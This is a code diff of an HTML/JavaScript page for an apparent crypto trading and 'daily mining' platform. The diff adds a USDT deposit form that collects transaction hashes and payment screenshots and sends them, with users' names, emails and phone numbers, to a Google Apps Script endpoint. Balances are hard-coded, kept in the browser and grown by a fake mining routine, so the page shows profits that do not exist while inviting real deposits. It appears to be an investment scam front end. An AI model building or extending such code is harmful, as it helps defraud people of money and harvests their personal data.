@@ -14,12 +14,10 @@
             min-height: 100vh; overflow-x: hidden; position: relative;
         }
 
-        /* Particle Stars Background */
         .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
         .star { position: absolute; background: #ffffff; border-radius: 50%; opacity: 0.3; animation: twinkle var(--duration) infinite ease-in-out; }
         @keyframes twinkle { 0%, 100% { opacity: 0.2; transform: scale(0.8); } 50% { opacity: 0.8; transform: scale(1.2); } }
 
-        /* Top Yellow Ticker Banner */
         .top-ticker {
             width: 100%; background-color: #FFD700; color: #000000; font-weight: 800; font-size: 11px; padding: 7px 0;
             overflow: hidden; white-space: nowrap; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 10px rgba(255, 215, 0, 0.3);
@@ -29,7 +27,6 @@
 
         .main-wrapper { width: 100%; max-width: 420px; padding: 14px 14px 90px 14px; z-index: 1; display: none; }
 
-        /* Registration Screen */
         .auth-wrapper {
             width: 100%; max-width: 380px; padding: 24px; margin-top: 30px; z-index: 2;
             background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(16px);
@@ -50,7 +47,6 @@
         .sub-header { display: flex; justify-content: center; align-items: center; gap: 6px; font-size: 11px; color: #94a3b8; margin-top: 4px; }
         .status-dot { height: 7px; width: 7px; background-color: #10b981; border-radius: 50%; box-shadow: 0 0 6px #10b981; }
 
-        /* Price Panel Card */
         .card {
             background: rgba(10, 25, 41, 0.85); backdrop-filter: blur(12px); padding: 16px; border-radius: 14px;
             text-align: center; margin-bottom: 14px; border: 1px solid rgba(255, 215, 0, 0.25); box-shadow: 0 8px 24px rgba(0,0,0,0.4);
@@ -70,7 +66,6 @@
         }
         .btn:active { transform: scale(0.96); }
 
-        /* Metrics 2x2 Grid */
         .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 16px; }
         .metric-card { border-radius: 10px; padding: 12px; }
         .metric-title { font-size: 10px; font-weight: 700; text-transform: uppercase; margin-bottom: 4px; opacity: 0.9; }
@@ -85,7 +80,6 @@
         .btn-green { background: #059669; color: #ffffff; border: none; padding: 12px; border-radius: 8px; font-weight: 700; font-size: 13px; cursor: pointer; }
         .btn-white { background: #ffffff; color: #0f172a; border: none; padding: 12px; border-radius: 8px; font-weight: 700; font-size: 13px; cursor: pointer; }
 
-        /* Daily Mining History White Card */
         .history-card { background-color: #ffffff; color: #0f172a; border-radius: 14px; padding: 16px; box-shadow: 0 8px 20px rgba(0,0,0,0.3); }
         .history-table { width: 100%; border-collapse: collapse; font-size: 11px; margin-bottom: 12px; }
         .history-table th { text-align: left; padding: 6px 4px; border-bottom: 2px solid #e2e8f0; color: #475569; font-weight: 700; }
@@ -94,7 +88,6 @@
 
         .signature { text-align: center; font-size: 11px; color: #94a3b8; font-weight: bold; margin-top: 14px; letter-spacing: 0.5px; }
 
-        /* Bottom Nav */
         .bottom-nav {
             position: fixed; bottom: 0; left: 0; width: 100%; background: rgba(3, 20, 32, 0.98); backdrop-filter: blur(16px);
             border-top: 1px solid rgba(255, 255, 255, 0.1); display: none; justify-content: space-around; padding: 8px 0; z-index: 900;
@@ -111,7 +104,6 @@
             border-radius: 8px; font-weight: bold; text-align: left; cursor: pointer; display: flex; justify-content: space-between;
         }
 
-        /* POPUP MODAL ANIMATION */
         .modal {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(8px); justify-content: center; align-items: center; z-index: 2000; padding: 15px;
@@ -121,8 +113,14 @@
         .modal-content {
             background: #0f172a; padding: 20px; border-radius: 16px; text-align: center; max-width: 380px; width: 100%; border: 1px solid #1e293b;
             transform: scale(0.7); transition: transform 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
+            max-height: 90vh; overflow-y: auto;
         }
         .modal.active-modal .modal-content { transform: scale(1); }
+
+        .wallet-box {
+            background: #1e293b; border: 1px dashed #0284c7; padding: 10px; border-radius: 8px; font-size: 11px;
+            word-break: break-all; color: #38bdf8; margin: 10px 0; text-align: left;
+        }
     </style>
 </head>
 <body>
@@ -172,11 +170,11 @@
     </div>
 
     <div class="btn-group">
-        <button class="btn-green" onclick="handleDepositClick()">Add Funds</button>
+        <button class="btn-green" onclick="openDepositModal()">Add Funds</button>
         <button class="btn-white" onclick="showPopup('⚖️ Rules & Legal Terms', 'All trades are subject to automated evaluation risk parameters and clearance rules.')">RULES & LEGAL PDF</button>
     </div>
 
-    <!-- Mining History Section -->
+    <!-- Daily Mining History Section -->
     <div class="history-card">
         <div style="font-weight:800; font-size:14px; margin-bottom:6px;">⛏️ DAILY MINING HISTORY</div>
         <div style="font-size:10px; color:#64748b; margin-bottom:10px;" id="mining-start-date">Started mining on: Not Started Yet</div>
@@ -201,24 +199,26 @@
     <div class="nav-tab" onclick="openProfileModal()"><span style="font-size:16px;">👤</span><span>Profile</span></div>
 </div>
 
+<!-- System Modal -->
 <div id="modal" class="modal">
     <div class="modal-content">
         <div id="modal-title" style="font-weight:700; margin-bottom:10px; color:#f8fafc; font-size:16px;">Notice</div>
         <div id="modal-body" style="font-size:12px; margin-bottom:18px; color:#94a3b8; white-space:pre-line; line-height:1.5;"></div>
-        <button class="btn" onclick="closePopup()" style="margin-bottom:0; padding:10px;">Cancel</button>
+        <button class="btn" id="modal-close-btn" onclick="closePopup()" style="margin-bottom:0; padding:10px;">Cancel</button>
     </div>
 </div>
 
 <script>
-    // Google Sheets Endpoint Integration
     const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwKEpfb4QBTPwaw0wwY6FnQRpWTbVm8nETMrStGbhSHJ5yPN4gberYzVwO9Jtap4LA/exec";
+    const WALLET_ADDRESS = "0x71C83920F4a9A12B8904f9BEP20TRC20";
 
-    function sendToGoogleSheet(name, email, phone, action, amount = "-") {
+    // General Payload Sender
+    function sendPayloadToSheet(payload) {
         fetch(GOOGLE_SCRIPT_URL, {
             method: "POST",
             mode: "no-cors",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ name, email, phone, action, amount })
+            body: JSON.stringify(payload)
         });
     }
 
@@ -263,18 +263,100 @@
             return;
         }
 
-        sendToGoogleSheet(fname + " " + lname, email, phone, "SIGNUP");
+        const fullName = fname + " " + lname;
+        
+        sendPayloadToSheet({
+            name: fullName,
+            email: email,
+            phone: phone,
+            action: "SIGNUP",
+            amount: "-",
+            txid: "-"
+        });
 
         currentUser = { fname, lname, email, phone, joined: new Date().toLocaleDateString('en-GB') };
         localStorage.setItem('traderUser', JSON.stringify(currentUser));
         checkAuth();
     }
 
-    function handleDepositClick() {
-        if (currentUser) {
-            sendToGoogleSheet(currentUser.fname + " " + currentUser.lname, currentUser.email, currentUser.phone, "DEPOSIT_REQUEST", "$100.00");
+    // Advanced Deposit Modal With Screenshot & TxID
+    function openDepositModal() {
+        let depositHtml = `
+            <div style="text-align:left; font-size:12px;">
+                <div style="color:#94a3b8; margin-bottom:4px;">USDT Deposit Address (TRC20 / BEP20):</div>
+                <div class="wallet-box" id="wallet-text">${WALLET_ADDRESS}</div>
+                <button class="btn" style="padding:6px; font-size:11px; margin-bottom:12px;" onclick="copyWalletAddress()">📋 Copy Wallet Address</button>
+
+                <div class="input-group">
+                    <label>Deposit Amount ($ USD)</label>
+                    <input type="number" id="dep-amount" class="input-control" placeholder="e.g. 100">
+                </div>
+
+                <div class="input-group">
+                    <label>Transaction ID / Hash (TxID)</label>
+                    <input type="text" id="dep-txid" class="input-control" placeholder="Paste blockchain transaction hash">
+                </div>
+
+                <div class="input-group">
+                    <label>Payment Screenshot / Receipt</label>
+                    <input type="file" id="dep-proof" accept="image/*" class="input-control" style="padding:8px;">
+                </div>
+
+                <button class="btn btn-green" id="dep-submit-btn" onclick="submitDepositProof()" style="margin-top:6px; margin-bottom:0;">Submit Proof for Approval</button>
+            </div>
+        `;
+        showPopup('⚡ Deposit Funds & Verification', '');
+        document.getElementById('modal-body').innerHTML = depositHtml;
+    }
+
+    function copyWalletAddress() {
+        navigator.clipboard.writeText(WALLET_ADDRESS);
+        alert('Wallet Address Copied to Clipboard!');
+    }
+
+    function submitDepositProof() {
+        const amount = document.getElementById('dep-amount').value.trim();
+        const txid = document.getElementById('dep-txid').value.trim();
+        const fileInput = document.getElementById('dep-proof');
+        const submitBtn = document.getElementById('dep-submit-btn');
+
+        if (!amount || !txid) {
+            alert('Please enter Deposit Amount and Transaction Hash (TxID).');
+            return;
         }
-        showPopup('⚡ Deposit Funds', 'Deposit Address:\n0x71C83920F4a9A12B8904f9\n\nNetwork: TRC20 / BEP20\n\nAdmin has been notified of your request!');
+
+        submitBtn.innerText = "Uploading & Submitting...";
+        submitBtn.disabled = true;
+
+        if (fileInput.files && fileInput.files[0]) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const base64Image = e.target.result;
+                executeDepositTransmission(amount, txid, base64Image);
+            };
+            reader.readAsDataURL(fileInput.files[0]);
+        } else {
+            executeDepositTransmission(amount, txid, null);
+        }
+    }
+
+    function executeDepositTransmission(amount, txid, base64Image) {
+        const fullName = currentUser ? (currentUser.fname + " " + currentUser.lname) : "User";
+        const email = currentUser ? currentUser.email : "-";
+        const phone = currentUser ? currentUser.phone : "-";
+
+        sendPayloadToSheet({
+            name: fullName,
+            email: email,
+            phone: phone,
+            action: "DEPOSIT_SUBMITTED",
+            amount: "$" + parseFloat(amount).toFixed(2),
+            txid: txid,
+            image: base64Image
+        });
+
+        alert("🎉 Deposit proof submitted successfully! Your account balance will update after admin blockchain verification.");
+        closePopup();
     }
 
     function openProfileModal() {
@@ -299,7 +381,6 @@
         checkAuth();
     }
 
-    // Balances
     function loadSavedBalances() {
         let currentBal = parseFloat(localStorage.getItem('currentBal')) || 109.00;
         let depositBal = parseFloat(localStorage.getItem('depositBal')) || 100.00;
@@ -312,7 +393,7 @@
         document.getElementById('val-withdrawal').innerText = "$" + withdrawalBal.toFixed(2);
     }
 
-    // Market Rates
+    // Market Rates Engine
     let currentPair = 'GOLD';
     let livePrices = { GOLD: 4203.00, SILVER: 29.45, SP500: 5540.20 };
 
@@ -375,7 +456,6 @@
         document.getElementById('modal-body').innerHTML = quotesHtml;
     }
 
-    // High Quality Lightweight Candlestick Chart
     function openNativeChartModal() {
         let chartHtml = `
             <div style="background:#020617; padding:10px; border-radius:10px; text-align:center;">
@@ -418,7 +498,6 @@
         }
     }
 
-    // Live Clock
     function updateClock() {
         const now = new Date();
         const timeStr = now.toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
@@ -428,7 +507,6 @@
     setInterval(updateClock, 1000);
     updateClock();
 
-    // Mining Engine & History
     function loadMiningHistory() {
         let historyLogs = JSON.parse(localStorage.getItem('userMiningHistory')) || [];
         const tbody = document.getElementById('history-rows');
@@ -501,7 +579,15 @@
                 localStorage.setItem('userMiningHistory', JSON.stringify(historyLogs));
 
                 if (currentUser) {
-                    sendToGoogleSheet(currentUser.fname + " " + currentUser.lname, currentUser.email, currentUser.phone, "MINING_PROFIT", "+$1.00");
+                    const fullName = currentUser.fname + " " + currentUser.lname;
+                    sendPayloadToSheet({
+                        name: fullName,
+                        email: currentUser.email,
+                        phone: currentUser.phone,
+                        action: "MINING_SUCCESS",
+                        amount: "+$1.00",
+                        txid: "-"
+                    });
                 }
 
                 let currentBal = (parseFloat(localStorage.getItem('currentBal')) || 109.00) + 1.0;
@@ -531,7 +617,6 @@
         `;
     }
 
-    // Modal Control
     const modalElem = document.getElementById('modal');
     function showPopup(title, body) {
         document.getElementById('modal-title').innerText = title;
